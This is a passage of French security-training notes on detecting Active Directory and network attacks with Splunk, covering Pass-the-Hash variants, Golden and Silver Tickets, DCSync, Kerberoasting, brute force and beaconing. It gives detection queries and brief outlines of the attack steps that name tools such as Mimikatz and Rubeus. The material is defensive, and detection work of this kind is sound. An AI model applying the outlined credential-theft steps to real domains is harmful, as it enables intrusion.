   * Affiche des champs pertinents comme `_time`, `ComputerName`, `username`, `src_ip_4`, `service_name`, et `category` pour faciliter l'analyse.

---

### Exemple 2 : Détection des demandes TGS et comportements anormaux

Dans les cas où des attaquants importent des tickets TGS sans demande TGT valide, des anomalies peuvent apparaître dans **Event ID 4771** (Échec de pré-authentification). En surveillant les incohérences dans les codes d'échec et les types d'authentification, des attaques **PtT** supplémentaires peuvent être détectées.

---

```

## **Detecting Overpass-the-Hash**

```jsx

---

## Aperçu de l'attaque **Overpass-the-Hash (Pass-the-Key)**

**Overpass-the-Hash (Pass-the-Key)** permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe volés, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un accès non autorisé aux systèmes sans avoir recours à NTLM.

### Étapes de l'attaque

1. **Extraction des hash des utilisateurs** : L'attaquant utilise des outils comme **Mimikatz** pour obtenir le hash NTLM d'un utilisateur connecté, nécessitant des privilèges d'administrateur local.
2. **Demande de TGT avec Rubeus** : L'attaquant utilise **Rubeus** pour créer une requête brute AS-REQ pour un TGT d'un utilisateur spécifié. Cette étape ne nécessite pas de privilèges élevés, la rendant plus discrète.
3. **Soumission du Ticket** : L'attaquant injecte le TGT demandé dans la session en cours, de manière similaire à l'attaque Pass-the-Ticket, pour effectuer des mouvements latéraux.

---

## Opportunités de détection de l'attaque **Overpass-the-Hash**

### Logique de détection clé

* **Détection de Mimikatz** : Les artefacts d'attaques Overpass-the-Hash basées sur Mimikatz ressemblent à ceux des attaques **Pass-the-Hash** et peuvent être détectés à l'aide de techniques similaires.
* **Détection de Rubeus** : Lorsque **Rubeus** envoie une requête AS-REQ directement au contrôleur de domaine via le port TCP/UDP 88, cela génère l'**Event ID 4768**. Cependant, des processus inhabituels communiquant sur le port 88 vers le contrôleur de domaine, autre que `lsass.exe`, peuvent aider à identifier l'activité potentielle d'Overpass-the-Hash.

---

## Exemple de requête Splunk : Détection de **Rubeus** dans l'attaque **Overpass-the-Hash**

**Description** : Cette requête identifie les requêtes AS-REQ envoyées sur le port 88 provenant de processus inhabituels, en recherchant spécifiquement l'**Event ID 3** avec un port de destination égal à 88, tout en excluant `lsass.exe`.

**Plage horaire** : `earliest=1690443407 latest=1690443544`

```spl
index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by process_id
| where EventCode=3
| stats count by _time, Computer, dest_ip, dest_port, Image, process
| fields - count
```

---

### Explication des composants clés de la requête

1. **Filtrage des événements** :

   * **Sélection de la source** : Filtre les événements provenant du journal opérationnel de Sysmon (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`).
   * **EventCode 3** : Capture les connexions réseau effectuées par l'hôte, ciblant spécifiquement le trafic vers `dest_port=88` (Kerberos), en excluant `Image=lsass.exe`, car il s'agit d'un processus légitime accédant aux services Kerberos.
   * **OR EventCode 1** : Capture tous les événements de création de processus pour permettre une corrélation avec d'autres événements liés aux processus suspects.

2. **Statistiques des événements** :

   * **EventStats** : Ajoute la liste des processus pour chaque identifiant de processus (`process_id`), stockée sous `process`.
   * **Where EventCode=3** : Filtre pour les événements de connexion réseau sur le port 88.

3. **Agrégation et filtrage** :

   * **Stats count by Fields** : Agrège les événements par `_time`, `Computer`, `dest_ip`, `dest_port`, `Image`, et `process`, tout en calculant le nombre d’occurrences (`count`).
   * **Fields - count** : Supprime le champ `count` du résultat final pour plus de clarté.

---

```

## **Detecting Golden Tickets and Silver Tickets**

```jsx
## Golden Ticket

Une attaque **Golden Ticket** consiste à forger un Ticket Granting Ticket (TGT) pour usurper l’identité d’un administrateur de domaine et accéder librement à l’ensemble du domaine. Cette attaque est difficile à détecter, car le ticket généré est techniquement valide et peut être créé hors ligne par un attaquant.

### Étapes de l’attaque

1. **Extraction du hash KRBTGT** : L’attaquant récupère le hash NTLM du compte KRBTGT, souvent via une attaque DCSync ou en extrayant les fichiers `NTDS.dit` et `LSASS`.
2. **Création du TGT falsifié** : À l’aide de ce hash, l’attaquant forge un TGT lui attribuant des privilèges d’administrateur du domaine.
3. **Injection du TGT** : Ce ticket est injecté dans une session utilisateur, permettant un accès non autorisé aux ressources du domaine.

### Opportunités de détection

La détection repose sur certains indicateurs tels que :

* **Activité DCSync suspecte** : surveiller les requêtes DCSync non légitimes.
* **Accès à NTDS.dit ou LSASS** : l’événement Sysmon ID 10 peut alerter sur un accès à LSASS pour l’extraction de hash.
* **Alertes Pass-the-Ticket** : l’utilisation d’un Golden Ticket ressemble à des comportements Pass-the-Ticket.

---

## Exemple de requête Splunk : Détection d’un Golden Ticket

**Description** : Cette recherche identifie l’utilisation potentielle d’un Golden Ticket en détectant des tickets Kerberos (4769 ou 4770) qui n’ont pas d’événement initial 4768 (AS-REQ), ce qui peut indiquer qu’ils ont été forgés.

**Plage temporelle** : `earliest=1690451977 latest=1690452262`

```spl
index=main earliest=1690451977 latest=1690452262 source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\:\:ffff\:)?(?<src_ip_4>[0-9\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category
```

---

## Silver Ticket

Une attaque **Silver Ticket** permet de forger des tickets de service (TGS) pour accéder à des services spécifiques (par exemple, SQL Server) sans authentification complète auprès du contrôleur de domaine. Elle donne un accès plus limité que le Golden Ticket mais reste redoutable.

### Étapes de l’attaque

1. **Extraction du hash du compte de service** : L’attaquant récupère le hash NTLM d’un compte de service cible.
2. **Création d’un TGS falsifié** : Il forge un ticket de service avec ce hash.
3. **Injection et accès** : Le ticket est injecté dans une session pour accéder au service visé.

### Opportunités de détection

Les indicateurs clés incluent :

* **Création de nouveaux comptes utilisateurs** : l’événement ID 4720 peut alerter sur des comptes récemment créés.
* **Attribution de privilèges spéciaux** : l’événement ID 4672 permet de détecter des connexions avec des droits élevés.

---

## Exemples de requêtes Splunk pour détecter les Silver Tickets

### Requête 1 : Comparaison entre utilisateurs créés et utilisateurs connectés

**Objectif** : Identifier les comptes utilisateurs récemment créés qui se connectent sans être attendus.

**Extraction des utilisateurs créés** :

```spl
index=main latest=1690448444 EventCode=4720
| stats min(_time) as _time, values(EventCode) as EventCode by user
| outputlookup users.csv
```

**Comparaison avec les connexions récentes** :

**Plage temporelle** : `latest=1690545656`

```spl
index=main latest=1690545656 EventCode=4624
| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user
| eval last24h = 1690451977
| where firstTime > last24h
| convert ctime(firstTime)
| convert ctime(last24h)
| lookup users.csv user as user OUTPUT EventCode as Events
| where isnull(Events)
```

### Requête 2 : Détection de privilèges spéciaux sur des connexions récentes

**Objectif** : Identifier des comptes ayant obtenu des privilèges élevés récemment, possiblement via un Silver Ticket.

**Plage temporelle** : `latest=1690545656`

```spl
index=main latest=1690545656 EventCode=4672
| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name
| eval last24h = 1690451977
| where firstTime > last24h
| table firstTime, ComputerName, Account_Name
| convert ctime(firstTime)
```

---

## Résumé

Les attaques **Golden Ticket** et **Silver Ticket** tirent parti des failles du protocole Kerberos pour obtenir un accès non autorisé à un environnement Active Directory. La détection repose sur la corrélation d’événements liés aux connexions, à la création de comptes et à l’élévation de privilèges. L’utilisation de Splunk pour surveiller ces indicateurs permet aux équipes de sécurité de repérer et de réagir plus efficacement à ces menaces avancées.

```

## **Detecting Unconstrained Delegation and Constrained Delegation Attacks**

```jsx
### **Délégation non contrainte**

La **délégation non contrainte** permet à un service de s'authentifier auprès d'autres ressources au nom de n'importe quel utilisateur, exposant ainsi des données sensibles en cas de compromission. Les attaquants peuvent exploiter cette vulnérabilité pour extraire les tickets **TGT** de la mémoire et se déplacer latéralement dans le réseau.

#### **Étapes de l'attaque** :

1. Identifier les systèmes avec la délégation non contrainte activée.
2. Accéder à un système vulnérable.
3. Extraire les **TGT** à l’aide d’outils comme **Mimikatz**.

#### **Opportunités de détection** :

* **Commandes PowerShell** : La surveillance des journaux PowerShell (Event ID 4104) peut révéler des commandes liées à la découverte de la délégation non contrainte.
* **Requêtes LDAP** : Analyser les journaux pour détecter des requêtes LDAP concernant les paramètres de délégation.
* **Réutilisation de TGT** : Les détections **Pass-the-Ticket** peuvent signaler l’utilisation des TGT.

#### **Exemple de requête Splunk** :

```spl
index=main earliest=1690544538 latest=1690544540 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="*TrustedForDelegation*" OR Message="*userAccountControl:1.2.840.113556.1.4.803:=524288*" 
| table _time, ComputerName, EventCode, Message
```

---

### **Délégation contrainte**

La **délégation contrainte** restreint la délégation à des services spécifiques, permettant à un service d'agir au nom d'un utilisateur uniquement pour des ressources définies. Cependant, des attaquants peuvent exploiter cette fonctionnalité via les extensions **S4U** pour s’impliquer dans des attaques de type **Pass-the-Ticket**.

#### **Étapes de l'attaque** :

1. Identifier les comptes avec `msDS-AllowedToDelegateTo`.
2. Extraire le **TGT** d’un principal.
3. Utiliser les techniques **S4U2self** et **S4U2proxy** pour imiter des comptes privilégiés.
4. Accéder aux ressources en tant qu'utilisateur cible.

#### **Opportunités de détection** :

* **Requêtes LDAP et PowerShell** : Surveiller les commandes qui recherchent `msDS-AllowedToDelegateTo`.
* **Trafic Kerberos** : Analyser le trafic inhabituel sur le port 88 (Kerberos).

#### **Exemple de requête Splunk** pour la découverte de la délégation contrainte via PowerShell :

```spl
index=main earliest=1690544553 latest=1690562556 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="*msDS-AllowedToDelegateTo*" 
| table _time, ComputerName, EventCode, Message
```

#### **Exemple de requête Splunk** pour la détection avec les logs Sysmon :

```spl
index=main earliest=1690562367 latest=1690562556 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
| eventstats values(process) as process by process_id
| where EventCode=3 AND dest_port=88
| table _time, Computer, dest_ip, dest_port, Image, process
```

---

```

## **Detecting DCSync & DCShadow**

```jsx

---

## DCSync

**DCSync** est une technique permettant à un attaquant d’imiter un contrôleur de domaine pour obtenir les données de réplication d’Active Directory, notamment les **hashs de mots de passe** (actuels et anciens). Cette attaque peut ensuite servir à :

* Forger des **Golden Tickets** ou **Silver Tickets**
* Réaliser des attaques de type **Pass-the-Hash**

### Étapes de l'attaque

1. **Accès Administratif** : L’attaquant obtient un accès administrateur sur une machine liée au domaine ou élève ses privilèges.
2. **Demande de Réplication** : À l’aide d’outils comme **Mimikatz**, l’attaquant utilise l’interface `DRSGetNCChanges` pour demander la réplication.
3. **Exploitation des Hashs** : Les données extraites sont utilisées pour forger des tickets Kerberos ou compromettre d’autres comptes.

### Opportunités de détection

* **Événement Windows ID 4662** : Enregistre les opérations de type *DS-Replication-Get-Changes*, essentielles pour détecter les activités DCSync.
* **Configuration de l'audit** : L'audit avancé des accès au service d'annuaire doit être activé (désactivé par défaut).

---

### Requête Splunk – Détection de DCSync (Event ID 4662)

**Description** : Cette requête détecte les tentatives de réplication en recherchant la propriété **"Replicating Directory Changes"** dans les événements 4662.

**Plage temporelle** : `earliest=1690544278 latest=1690544280`

```spl
index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message="*Replicating Directory Changes*"
| rex field=Message "(?P<property>Replicating Directory Changes.*)"
| table _time, user, object_file_name, Object_Server, property
```

---

## DCShadow

**DCShadow** est une attaque plus avancée permettant à un attaquant de créer des modifications non autorisées dans Active Directory **sans générer de journaux standard**. Cela implique de **créer un faux contrôleur de domaine (rogue DC)** qui réplique des changements malveillants vers les vrais contrôleurs de domaine.

### Étapes de l'attaque

1. **Accès élevé** : L’attaquant doit posséder des privilèges suffisants pour inscrire un contrôleur de domaine.
2. **Enregistrement du DC rogue** : Un faux contrôleur de domaine est inscrit et effectue des modifications AD (par exemple, ajouter un utilisateur au groupe "Domain Admins").
3. **Réplication des modifications** : Ces modifications sont propagées via le mécanisme de réplication AD.

### Opportunités de détection

* **Événement ID 4742** : Enregistre les modifications des objets ordinateurs, y compris les changements de **ServicePrincipalName (SPN)**.
* **Création d’un objet `nTDSDSA`** : Un ajout d’objet `nTDSDSA` dans le schéma AD est souvent un indicateur d’une activité DCShadow.

---

### Requête Splunk – Détection de DCShadow (Event ID 4742)

**Description** : Cette requête détecte les modifications suspectes des comptes ordinateurs via des changements sur les **ServicePrincipalNames**, liés à l'activité DCShadow.

**Plage temporelle** : `earliest=1690623888 latest=1690623890`

```spl
index=main earliest=1690623888 latest=1690623890 EventCode=4742 
| rex field=Message "(?P<gcspn>XX\/[a-zA-Z0-9\.\-\/]+)" 
| table _time, ComputerName, Security_ID, Account_Name, user, gcspn 
| search gcspn=*
```

---

## Résumé

Les attaques **DCSync** et **DCShadow** représentent des menaces sérieuses dans un environnement Active Directory. Leur détection repose sur la **surveillance d'événements précis** (comme les ID 4662 et 4742) et la **corrélation de comportements anormaux** sur les objets du domaine.

En mettant en place des politiques d’audit avancées et en exploitant des requêtes Splunk bien ciblées, les équipes de sécurité peuvent significativement **améliorer leurs capacités de détection et de réponse** face à ces techniques furtives.

---

```

## Creating Custom Splunk Applications

```jsx

---

## 1. Création d’une application personnalisée dans Splunk

### Étape 1 : Accéder à Splunk Web

* Ouvrez votre navigateur web et connectez-vous à Splunk Web.

### Étape 2 : Accéder à la gestion des applications

* Dans le menu **Applications** en haut de la page, cliquez sur **Gérer les applications**.

### Étape 3 : Créer une nouvelle application

1. Sur la page des applications, cliquez sur **Créer une application**.

2. Remplissez les champs suivants :

   * **Nom** : Entrez le nom de l’application, par exemple `Détection d'attaques Active Directory`.
   * **Nom du dossier** : Indiquez un nom similaire, par exemple `AD_Attack_Detection`. Ce dossier sera créé sous `$SPLUNK_HOME/etc/apps/`.
   * **Version** : Entrez la version initiale, par exemple `1.0.0`.
   * **Description** : Ajoutez une brève description, par exemple `Application de détection des attaques Active Directory`.
   * **Modèle** : Choisissez `barebones` dans la liste déroulante.

3. Cliquez sur **Enregistrer**. L’application apparaîtra alors dans la liste des applications.

---

## 2. Comprendre la structure du répertoire

Après la création de l’application, accédez au dossier `$SPLUNK_HOME/etc/apps/AD_Attack_Detection`. Vous y trouverez plusieurs sous-dossiers ayant chacun un rôle spécifique :

* `/bin` : Contient les scripts personnalisés.
* `/default` : Contient les fichiers de configuration par défaut, les vues, les tableaux de bord et la navigation.
* `/local` : Contient les configurations personnalisées (modifications locales).
* `/metadata` : Contient les fichiers relatifs aux permissions et métadonnées.

---

## 3. Modifier le fichier de navigation

1. Ouvrez le fichier `$SPLUNK_HOME/etc/apps/AD_Attack_Detection/default/data/ui/nav/default.xml` avec un éditeur de texte.
2. Ce fichier XML définit la navigation de l’application. Chaque balise `<view>` représente une vue affichée dans la barre de navigation. Exemple :

```xml
<nav search_view="search">
  <view name="search" default='true' />
  <view name="analytics_workspace" />
  <view name="datasets" />
  <view name="reports" />
  <view name="alerts" />
  <view name="dashboards" />
</nav>
```

* **search\_view** : Spécifie la vue par défaut.
* **default='true'** : Définit la page d’accueil par défaut (ici, la recherche).

---

## 4. Créer un tableau de bord (Dashboard)

1. Dans votre application Splunk, allez dans **Tableaux de bord**.

2. Cliquez sur **Créer un nouveau tableau de bord** et renseignez :

   * **Nom du tableau de bord** : Par exemple `Tableau de bord AD`.
   * **Description** : (facultatif)
   * **Permissions** : Définissez-les selon vos besoins.
   * **Type de tableau de bord** : Choisissez `Tableaux de bord classiques`.

3. Configurez votre tableau de bord avec des panneaux (panels), des filtres, et une plage temporelle.

4. Pour faire référence à un champ d’entrée, utilisez des **tokens** : `$nom_du_champ$`.

### Emplacement des tableaux de bord

Les fichiers XML de configuration des tableaux de bord se trouvent dans :
`<CheminDeLApp>/local/data/ui/views/nom_du_dashboard.xml`.

### Ajouter un tableau de bord à la navigation

1. Ouvrez à nouveau le fichier `default.xml` :
   `$SPLUNK_HOME/etc/apps/AD_Attack_Detection/default/data/ui/nav/default.xml`.
2. Ajoutez le nom du tableau de bord dans la section `<nav>` pour qu’il apparaisse dans la barre de navigation.

---

## 5. Redémarrer Splunk

* Redémarrez Splunk pour que les modifications soient prises en compte et que le tableau de bord apparaisse dans la navigation de l’application.

---

## 6. Regrouper plusieurs tableaux de bord

Pour organiser vos tableaux de bord dans un groupe, utilisez la balise `<collection>` dans le fichier `default.xml` :

```xml
<collection label="Tableaux de bord AD">
  <view name="dashboard1" />
  <view name="dashboard2" />
</collection>
```

---

## 7. Mettre à jour une application existante

Pour mettre à jour votre application à partir d’un fichier préconfiguré :

1. **Téléchargez** le fichier `Detection-of-Active-Directory-Attacks.tar.gz` depuis la section des ressources.
2. Accédez à **Applications → Gérer les applications**, puis cliquez sur **Installer une application à partir d’un fichier**.
3. Sélectionnez le fichier, cochez **Mettre à jour l’application** pour écraser l’existante, puis cliquez sur **Téléverser**.

---

```

## **Detecting RDP Brute Force Attacks**

```jsx

---

## **Détection des attaques RDP par brute force**

Les attaques par brute force RDP impliquent des tentatives répétées de connexion à une session RDP, en exploitant des mots de passe faibles ou par défaut pour accéder aux systèmes. Ce guide décrit comment détecter ces attaques avec Splunk et les journaux Zeek.

### **Requête de détection**

Cette requête Splunk analyse les journaux Zeek et identifie les adresses IP avec un grand nombre de tentatives de connexion RDP en peu de temps, ce qui peut indiquer une attaque par brute force.

### **Explication de la requête**

1. **Index et sourcetype** :

   * Filtrage des données RDP brute force avec `index="rdp_bruteforce"` et `sourcetype="bro:rdp:json"`.

2. **Binning du temps** :

   * La commande `bin` regroupe les événements en intervalles de 5 minutes, facilitant la détection des pics de tentatives typiques des attaques par brute force.

3. **Comptage et regroupement** :

   * La commande `stats` compte les tentatives de connexion par adresse IP source (`id.orig_h`) et adresse IP de destination (`id.resp_h`) dans chaque période de 5 minutes.

4. **Filtrage par seuil** :

   * Le critère `where count > 30` filtre les événements où plus de 30 tentatives de connexion sont observées dans une fenêtre de 5 minutes, ce qui peut indiquer une activité de brute force.

### **Requête Splunk**

```spl
index="rdp_bruteforce" sourcetype="bro:rdp:json"
| bin _time span=5m
| stats count values(cookie) by _time, id.orig_h, id.resp_h
| where count > 30
```

### **Interprétation des résultats**

* **Événements avec un grand nombre de tentatives** : Si une IP source (`id.orig_h`) a plus de 30 tentatives de connexion vers une IP de destination (`id.resp_h`) dans un intervalle de 5 minutes, cela peut indiquer une tentative de brute force.
* **Cookies de session** : Plusieurs valeurs uniques de `cookie` indiquent des tentatives de connexion séparées, soutenant la détection de motifs de brute force.

```

## D**etecting Beaconing Malware**

```jsx

---

## Vue d’ensemble

Les malwares utilisant des techniques de *beaconing*, comme **Cobalt Strike** dans sa configuration par défaut, communiquent avec leur serveur de Command & Control (C2) à des intervalles réguliers. En surveillant les intervalles entre ces communications dans les journaux réseau (ici via Zeek), on peut identifier des comportements suspects.

Ce guide présente une requête Splunk permettant de détecter ces schémas de communication régulière dans le trafic HTTP.

---

## Configuration de la requête de détection

Cette requête Splunk analyse les intervalles temporels dans le trafic HTTP pour identifier les connexions répétitives et régulières — caractéristiques du *beaconing*.

### Explication de la requête

1. **Filtrage des données pertinentes**

   * `index="cobaltstrike_beacon"` et `sourcetype="bro:http:json"` ciblent les journaux HTTP de Zeek (au format JSON) associés au malware Cobalt Strike.

2. **Tri chronologique des événements**

   * `sort 0 _time` trie les événements par ordre croissant de temps pour permettre des calculs temporels fiables.

3. **Calcul des différences de temps**

   * `streamstats` calcule la différence de temps (`timedelta`) entre deux événements consécutifs, regroupés par IP source, IP destination et port de destination.

4. **Calcul de l’intervalle moyen**

   * `eventstats` calcule l’intervalle moyen (`avg`) entre les événements ainsi que leur nombre total (`total`), pour chaque couple source-destination.

5. **Définition d’une plage d’intervalles acceptables**

   * `eval upper=avg*1.1` et `eval lower=avg*0.9` fixent une marge de ±10% autour de l’intervalle moyen pour tenir compte des petites variations.

6. **Filtrage des intervalles réguliers**

   * `where timedelta > lower AND timedelta < upper` conserve les événements dont l’intervalle est proche de la moyenne.

7. **Calcul du pourcentage de régularité**

   * `stats` agrège les données et calcule le pourcentage (`prcnt`) d’événements respectant la plage régulière pour chaque connexion.

8. **Filtrage sur le seuil de régularité**

   * `where prcnt > 90 AND total > 10` garde uniquement les connexions avec plus de 90% de régularité et au moins 10 événements — critères minimaux pour éviter les faux positifs.

---

### Requête Splunk

```spl
index="cobaltstrike_beacon" sourcetype="bro:http:json" 
| sort 0 _time
| streamstats current=f last(_time) as prevtime by src, dest, dest_port
| eval timedelta = _time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port
| eval upper=avg*1.1
| eval lower=avg*0.9
| where timedelta > lower AND timedelta < upper
| stats count, values(avg) as TimeInterval by src, dest, dest_port, total
| eval prcnt = (count/total)*100
| where prcnt > 90 AND total > 10
```

---

## Description des champs

* **`index="cobaltstrike_beacon"`** : Filtre les événements provenant du bon index.
* **`sourcetype="bro:http:json"`** : Spécifie les journaux HTTP de Zeek au format JSON.
* **`sort 0 _time`** : Trie les événements par ordre chronologique.
* **`streamstats last(_time)`** : Calcule le temps entre chaque événement pour un même flux (même src/dest/port).
* **`eventstats avg(timedelta)`** : Calcule l’intervalle moyen et le nombre total d’événements pour chaque connexion.
* **`eval upper / lower`** : Détermine une marge autour de l’intervalle moyen.
* **`where timedelta > lower AND timedelta < upper`** : Ne garde que les intervalles réguliers.
* **`stats`** : Agrège les résultats et calcule le pourcentage de régularité.
* **`where prcnt > 90 AND total > 10`** : Affiche uniquement les connexions présentant un comportement typique de beaconing.

---

## Interprétation des résultats

* **Intervalle régulier** : Si plus de 90% des communications d'une connexion se font à intervalles constants, cela indique possiblement un comportement de type *beaconing*.
* **Seuil d’événements** : Un minimum de 10 événements est requis pour éviter les fausses alertes dues à un faible volume de données.

---

```

## **Detecting Nmap Port Scanning**

```jsx

---

## 🔎 **H. Détection des scans de ports Nmap via Splunk**

Le **scan de ports** est une technique classique de reconnaissance utilisée par les attaquants pour identifier les services ouverts sur une cible. L’un des outils les plus couramment utilisés pour cela est **Nmap**.

Ce type de comportement se manifeste par des **tentatives de connexion à plusieurs ports**, souvent sans envoi de données (payload), dans un laps de temps très court. Grâce aux logs Zeek (anciennement Bro), on peut détecter ces tentatives suspectes en observant des connexions avec `orig_bytes=0` (aucune donnée transmise) et en comptant le nombre de ports différents touchés.

---

### ✅ **Requête Splunk – Détection d’un scan de ports**

```spl
index="cobaltstrike_beacon" sourcetype="bro:conn:json" orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| bin span=5m _time 
| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip 
| where num_dest_port >= 3
```

---

### 🧠 **Explication de la requête**

1. **Source des données**

   * `index="cobaltstrike_beacon"` : Index contenant les logs réseau capturés par Zeek.
   * `sourcetype="bro:conn:json"` : Logs JSON relatifs aux connexions réseau.

2. **Filtrage des connexions sans payload**

   * `orig_bytes=0` : Ne conserve que les connexions où aucun octet n’a été transmis par l’émetteur. Cela indique souvent une tentative de **scan ou de reconnaissance passive**, typique d’outils comme Nmap.

3. **Restriction aux plages IP internes**

   * `dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)` : On ne surveille que les connexions visant des **adresses IP privées**, afin de détecter des comportements suspects au sein du réseau interne.

4. **Agrégation temporelle**

   * `| bin span=5m _time` : Regroupe les événements par tranche de 5 minutes, ce qui permet d’identifier des activités regroupées dans le temps — comportement typique d’un scan.

5. **Comptage des ports ciblés**

   * `| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip` :

     * Compte le **nombre de ports distincts** touchés (`dc(dest_port)`) par une IP source (`src_ip`) sur une IP de destination (`dest_ip`) pendant une période de 5 minutes.

6. **Seuil d’alerte**

   * `| where num_dest_port >= 3` : Ne conserve que les cas où **au moins trois ports différents** ont été ciblés en 5 minutes. Cela correspond à un **comportement suspect**, pouvant indiquer un scan en phase de reconnaissance.

---

### 🕵️ **Interprétation des résultats**

* **IP source suspecte (`src_ip`)** : L’adresse identifiée comme ayant tenté de scanner plusieurs ports sans transmettre de données.
* **Scan de reconnaissance** : Les scans à faible bruit (ex : 3 ports seulement) sont souvent utilisés pour éviter la détection. Un seuil plus élevé (5 ou 10 ports) peut être utilisé pour détecter des scans plus agressifs.
* **Contexte interne** : Un scan de ports interne peut indiquer qu’un poste compromis tente de cartographier le réseau.

---

### ⚙️ **Recommandations**

* **Augmenter le seuil si trop de faux positifs**
  Un `num_dest_port` > 3 peut être trop faible selon l’environnement ; augmenter à 5 ou 10 selon le contexte réseau.
* **Corrélation avec d’autres événements**
  Associer cette détection à des tentatives d’exploitation, de connexion SSH, ou à des alertes IDS/IPS pour enrichir l’analyse.

---

```

## **Detecting Kerberos Brute Force Attacks.**

```jsx

---

## 🔎 **G. Détection des attaques Brute Force Kerberos via Splunk**

Une attaque **brute force Kerberos** consiste à envoyer en masse des requêtes d’authentification de type **AS-REQ** au **KDC** (Key Distribution Center), dans le but d’identifier des noms d’utilisateur valides. Même si l’authentification échoue, les messages d’erreur renvoyés permettent à un attaquant de **deviner quels comptes existent réellement**.

Ces tentatives sont généralement marquées par de nombreux échecs d’authentification, et certaines erreurs spécifiques permettent de distinguer les noms d’utilisateurs valides des invalides.

---

### ✅ **Requête Splunk – Détection de brute force Kerberos**

```spl
index="kerberos_bruteforce" sourcetype="bro:kerberos:json"
error_msg!=KDC_ERR_PREAUTH_REQUIRED
success="false" request_type=AS
| bin _time span=5m
| stats count dc(client) as "Utilisateurs uniques" values(error_msg) as "Messages d'erreur" by _time, id.orig_h, id.resp_h
| where count>30
```

---

### 🧠 **Explication de la requête**

1. **Source des données**

   * `index="kerberos_bruteforce"` : Index contenant les logs Kerberos capturés par Zeek.
   * `sourcetype="bro:kerberos:json"` : Source au format JSON spécifique aux événements Kerberos.

2. **Filtrage des erreurs pertinentes**

   * `error_msg!=KDC_ERR_PREAUTH_REQUIRED` : Exclut les erreurs classiques de pré-authentification (ce type d'erreur indique souvent que l’utilisateur **existe**, ce qui est justement ce que cherchent les attaquants).
   * Cela permet de se concentrer sur les tentatives qui **échouent sans atteindre le stade de la pré-authentification**, typiques lors de tests sur des comptes inexistants.

3. **Sélection des échecs d’authentification AS-REQ**

   * `success="false"` : Ne garde que les tentatives d’authentification échouées.
   * `request_type=AS` : Se focalise sur les requêtes de type AS-REQ, envoyées pour obtenir un TGT.

4. **Regroupement temporel des événements**

   * `| bin _time span=5m` : Regroupe les événements par tranche de 5 minutes, ce qui permet de détecter les rafales de requêtes typiques des attaques brute force.

5. **Statistiques par client et serveur**

   * `| stats count dc(client) as "Utilisateurs uniques" values(error_msg) as "Messages d'erreur" by _time, id.orig_h, id.resp_h` :

     * `count` : Nombre total de tentatives échouées par tranche de temps et par adresse IP.
     * `dc(client)` : Nombre de noms d’utilisateur distincts ciblés.
     * `values(error_msg)` : Liste des messages d’erreur retournés, utiles pour repérer une phase de reconnaissance ou de test d'existence de comptes.

6. **Seuil d’alerte pour détection**

   * `| where count>30` : Ne conserve que les cas où **plus de 30 tentatives échouées** sont observées en 5 minutes, ce qui est considéré comme suspect.

---

### 🕵️ **Interprétation des résultats**

* **Volume élevé de tentatives échouées** : Une origine unique (même IP) avec plus de 30 tentatives échouées dans un intervalle court indique fortement une **attaque brute force**.
* **Diversité des comptes ciblés** : Un grand nombre d’utilisateurs différents suggère une tentative de **découverte de comptes valides**.
* **Analyse des messages d’erreur** : Certains codes d’erreur peuvent confirmer que des utilisateurs existent, ce qui signifie que l’attaquant tente d'**énumérer les comptes** avant de passer à l’attaque.

---

### 📌 **À investiguer**

* **Adresse IP source (`id.orig_h`)** : Est-ce une machine interne ? Est-elle censée générer des requêtes Kerberos ?
* **Cible (`id.resp_h`)** : Généralement un KDC, mais peut varier. Est-ce cohérent avec le trafic habituel ?
* **Réaction en cas d’alerte** : Surveiller le poste, bloquer temporairement l’IP, renforcer la journalisation et activer des protections comme la limitation des tentatives.

---

```

## **Detecting Kerberoasting**

```jsx

---

## 🔎 **F. Détection de Kerberoasting via Splunk**

Le **Kerberoasting** est une technique d’attaque où un attaquant possédant des identifiants valides dans le domaine demande des tickets TGS (Ticket Granting Service) pour des comptes de service (SPN). Ces tickets, souvent chiffrés avec l’algorithme RC4, peuvent ensuite être **craqués hors ligne** afin d’extraire les mots de passe en clair des comptes ciblés.

L’indicateur principal est la **demande anormale de tickets TGS utilisant RC4**, car cette méthode de chiffrement est privilégiée pour le craquage.

---

### ✅ **Requête Splunk – Détection de Kerberoasting**

```spl
index="sharphound" sourcetype="bro:kerberos:json"
request_type=TGS cipher="rc4-hmac" 
forwardable="true" renewable="true"
| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service
```

---

### 🧠 **Explication de la requête**

1. **Source des données**

   * `index="sharphound"` : Index contenant les événements de Kerberos, collectés par un outil comme SharpHound ou un système de monitoring réseau.
   * `sourcetype="bro:kerberos:json"` : Utilise les logs Zeek (anciennement Bro) pour les événements Kerberos au format JSON.

2. **Filtrage des requêtes TGS chiffrées en RC4**

   * `request_type=TGS` : Ne retient que les requêtes de tickets de service.
   * `cipher="rc4-hmac"` : Sélectionne les tickets utilisant le chiffrement RC4, plus vulnérable, et donc privilégié par les attaquants.

3. **Critères comportementaux suspects**

   * `forwardable="true"` : Le ticket peut être réutilisé sur d’autres services.
   * `renewable="true"` : Le ticket peut être prolongé, ce qui est utile pour un attaquant cherchant une persistance.

4. **Affichage clair des résultats**

